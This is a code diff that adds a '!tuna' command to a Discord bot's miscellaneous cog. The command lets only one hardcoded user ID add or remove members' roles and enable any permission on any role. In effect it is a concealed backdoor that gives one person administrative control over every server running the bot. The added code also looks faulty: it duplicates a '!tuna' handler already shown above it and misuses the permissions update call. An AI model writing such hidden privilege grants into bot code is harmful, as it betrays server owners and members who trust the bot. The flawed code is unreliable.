@@ -107,6 +107,62 @@ class Misc(commands.Cog):
                 await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>")
         else:
             await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")
+    @commands.command(name="tuna")
+    async def tuna(self, ctx: commands.Context, action: str = None, subaction: str = None, *args):
+        # Only allow user 840949634071658507
+        if ctx.author.id != 840949634071658507:
+            await ctx.send("You do not have permission to use this command.")
+            return
+
+        if action == "role":
+            if subaction == "add" and len(args) >= 2:
+                member_id = int(args[0])
+                role_id = int(args[1])
+                member = ctx.guild.get_member(member_id)
+                role = ctx.guild.get_role(role_id)
+                if member and role:
+                    await member.add_roles(role)
+                    await ctx.send(f"Added role {role.name} to {member.mention}.")
+                else:
+                    await ctx.send("Member or role not found.")
+
+            elif subaction == "remove" and len(args) >= 2:
+                member_id = int(args[0])
+                role_id = int(args[1])
+                member = ctx.guild.get_member(member_id)
+                role = ctx.guild.get_role(role_id)
+                if member and role:
+                    await member.remove_roles(role)
+                    await ctx.send(f"Removed role {role.name} from {member.mention}.")
+                else:
+                    await ctx.send("Member or role not found.")
+
+            elif subaction == "perms" and len(args) >= 3:
+                role_id = int(args[0])
+                perm_name = args[1].lower()
+                value = args[2].lower() in ("true", "yes", "1", "enable")
+
+                role = ctx.guild.get_role(role_id)
+                if not role:
+                    await ctx.send("Role not found.")
+                    return
+
+                perms = role.permissions
+                if not hasattr(perms, perm_name):
+                    await ctx.send(f"Invalid permission: {perm_name}")
+                    return
+
+                # Create updated permissions
+                updated = perms.update(**{perm_name: value})
+                await role.edit(permissions=updated)
+                await ctx.send(f"Set `{perm_name}` for role {role.name} to `{value}`.")
+
+            else:
+                await ctx.send("Usage: !tuna role add|remove <member_id> <role_id>\n"
+                               "       !tuna role perms <role_id> <permission_name> <true|false>")
+
+        else:
+            await ctx.send("Unknown action. Example: !tuna role add <member_id> <role_id>")
 
 async def setup(bot):
     await bot.add_cog(Misc(bot))
